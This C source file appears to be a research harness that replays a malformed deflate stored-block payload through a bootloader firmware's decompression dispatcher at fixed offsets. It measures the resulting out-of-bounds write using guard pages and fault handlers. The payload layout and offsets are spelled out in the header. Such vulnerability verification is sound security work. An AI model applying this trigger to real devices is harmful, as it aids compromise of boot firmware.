// poc205_23g83.c — V2 live re-verification on mBoot-18000.162.10 (23G83)
// Replays the proven deflate stored-block runaway-write PoC (poc_205_stored.bin:
// BFINAL=1 BTYPE=00 LEN=0xFFFF NLEN=0xFFFF + 32 attacker bytes) through the REAL
// dispatcher (ids 0x205/0x505) at dstcaps smaller than the declared stored length.
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <signal.h>
#include <setjmp.h>

typedef uint8_t u8; typedef uint32_t u32; typedef uint64_t u64;
#define GUARD (512*1024)
#define APRON (64*1024)

static u8 *g_fw; static size_t g_fw_sz;
typedef long (*fn_disp)(void*,size_t,const void*,size_t,void*,u32);
static fn_disp g_disp;
/* Convention (matches qsweep): DS_FW selects the firmware image;
 * UNSET = OLD shipping build 162.8 (/tmp/ds_iboot/iboot_dec.bin).
 * The compression cluster shifts +0x80 between builds:
 *   dispatcher entry 0x1EB3C8 (162.8) / 0x1EB448 (162.10). */
static const char *g_fw_path = "/tmp/ds_iboot/iboot_dec.bin";
static uintptr_t OFF_DISP = 0x1EB3C8;

static sigjmp_buf g_jb; static volatile int g_armed;
static volatile int g_sig; static volatile u64 g_pc, g_addr;
static void handler(int sig, siginfo_t *si, void *uc) {
  ucontext_t *u = (ucontext_t*)uc;
  g_sig = sig; g_pc = u->uc_mcontext->__ss.__pc; g_addr = (u64)si->si_addr;
  int armed = g_armed; g_armed = 0;
  fprintf(stderr, "    [fault] sig=%d %s addr_off_fw=%llx pc_off=%llx lr_off=%llx armed=%d\n",
    sig, (u->uc_mcontext->__es.__esr & 0x40) ? "WRITE" : "READ",
    (unsigned long long)((long long)g_addr - (long long)g_fw),
    (unsigned long long)(g_pc - (u64)g_fw),
    (unsigned long long)(u->uc_mcontext->__ss.__lr - (u64)g_fw), armed);
  if (!armed) _exit(66);
  siglongjmp(g_jb, 1);
}

int main(int argc, char **argv) {
  const char *pocp = argc > 1 ? argv[1] : "/tmp/ds_iboot/poc_205_stored.bin";
  if (getenv("DS_FW")) g_fw_path = getenv("DS_FW");
  if (strstr(g_fw_path, "23g83")) OFF_DISP = 0x1EB448;   /* 162.10 build */
  setvbuf(stdout, NULL, _IONBF, 0); setvbuf(stderr, NULL, _IONBF, 0);

  struct sigaction sa; memset(&sa, 0, sizeof sa);
  sa.sa_sigaction = handler; sa.sa_flags = SA_SIGINFO | SA_NODEFER;
  for (int s = 1; s < 32; s++)
    if (s != SIGKILL && s != SIGSTOP) sigaction(s, &sa, NULL);

  int fd = open(g_fw_path, O_RDONLY);
  if (fd < 0) { perror("fw"); return 1; }
  struct stat st; fstat(fd, &st); g_fw_sz = st.st_size;
  size_t rnd = (g_fw_sz + 0x3FFF) & ~0x3FFFul;
  u8 *base = mmap(NULL, rnd + (32<<20), PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
  if (base == MAP_FAILED) { perror("reserve"); return 1; }
  if (mmap(base, g_fw_sz, PROT_READ|PROT_EXEC, MAP_FILE|MAP_PRIVATE|MAP_FIXED, fd, 0) != base)
    { perror("fw map"); return 1; }
  close(fd);
  g_fw = base; g_disp = (fn_disp)(g_fw + OFF_DISP);

  fd = open(pocp, O_RDONLY);
  if (fd < 0) { perror("poc"); return 1; }
  fstat(fd, &st);
  u8 *pocb = malloc(st.st_size);
  if (read(fd, pocb, st.st_size) != st.st_size) { perror("read"); return 1; }
  close(fd);
  printf("[poc] %s %lld bytes:", pocp, (long long)st.st_size);
  for (long i = 0; i < st.st_size && i < 12; i++) printf(" %02x", pocb[i]);
  printf("\n");
  printf("[fw] %s disp@%zx\n", g_fw_path, OFF_DISP);

  size_t caps[] = { 16, 15, 32, 64 };
  static const u32 ids[2] = { 0x205, 0x505 };
  for (unsigned c = 0; c < sizeof caps/sizeof caps[0]; c++) {
    for (unsigned k = 0; k < 2; k++) {
      size_t cap = caps[c];
      size_t capr = (cap + 0x3FFF) & ~0x3FFFul;          /* 16K pages on arm64 mac */
      size_t total = GUARD + APRON + capr + APRON + GUARD + 0x4000;
      u8 *m = mmap(NULL, total, PROT_READ|PROT_WRITE, MAP_ANON|MAP_PRIVATE, -1, 0);
      if (m == MAP_FAILED) { perror("mmap"); return 1; }
      if (mprotect(m, GUARD, PROT_NONE)) { perror("mprot lo"); return 1; }
      if (mprotect(m + GUARD + APRON + capr + APRON, GUARD, PROT_NONE)) { perror("mprot hi"); return 1; }
      memset(m + GUARD, 0xA5, APRON);
      memset(m + GUARD + APRON + capr, 0x5A, APRON);
      u8 *pl = m + GUARD + APRON;
      memset(pl, 0x11, capr);                            /* prefill ENTIRE writable span */
      u8 *scr = calloc(1, 192*1024);

      g_sig = 0; g_pc = 0; g_addr = 0; g_armed = 1;
      long ret = 0;
      if (sigsetjmp(g_jb, 1) == 0) {
        ret = g_disp(pl, cap, pocb, st.st_size, scr, ids[k]);
        g_armed = 0;
        printf("id=%#x dcap=%-3zu RETURNED ret=%ld", ids[k], cap, ret);
      } else {
        printf("id=%#x dcap=%-3zu FAULTED sig=%d pc_off=%llx addr_vs_dst=%+lld",
               ids[k], cap, g_sig,
               (unsigned long long)(g_pc - (u64)g_fw),
               (long long)((long long)g_addr - (long long)pl));
      }
      /* evidence scan: how far did attacker 0x5a / corruption spread */
      long last11 = -1, firstnon = -1, lastw = -1;
      for (long j = 0; j < (long)capr; j++) {
        if (pl[j] != 0x11) { if (firstnon < 0) firstnon = j; lastw = j; }
        else last11 = j;
      }
      int hidirty = 0;
      for (size_t j = 0; j < APRON; j++) if (m[GUARD+APRON+capr+j] != 0x5A) { hidirty = 1; break; }
      printf(" | intact-prefix=[0..%ld) corrupt=[%ld..%ld) cap=%zu OOBbytes=%ld hiApronDirty=%d\n",
             last11 + 1, firstnon < 0 ? 0 : firstnon, lastw + 1, cap,
             lastw >= (long)cap ? lastw + 1 - (long)cap : 0, hidirty);
      free(scr); munmap(m, total);
    }
  }
  free(pocb);
  return 0;
}
